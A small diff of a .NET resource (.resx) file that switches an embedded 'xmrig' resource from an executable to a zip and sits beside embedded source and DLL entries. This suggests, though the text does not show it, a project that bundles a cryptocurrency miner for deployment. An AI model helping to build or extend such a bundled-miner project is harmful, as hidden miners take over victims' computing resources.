@@ -127,9 +127,6 @@
   <data name="Program" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Resources\Program.vb;System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089;utf-8</value>
   </data>
-  <data name="xmrig" type="System.Resources.ResXFileRef, System.Windows.Forms">
-    <value>..\Resources\xmrig.exe;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
-  </data>
   <data name="libs" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Resources\libs.zip;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
   </data>
@@ -138,5 +135,8 @@
   </data>
   <data name="Project1" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Resources\Project1.dll;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </data>
+  <data name="xmrig" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\xmrig.zip;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
   </data>
 </root>
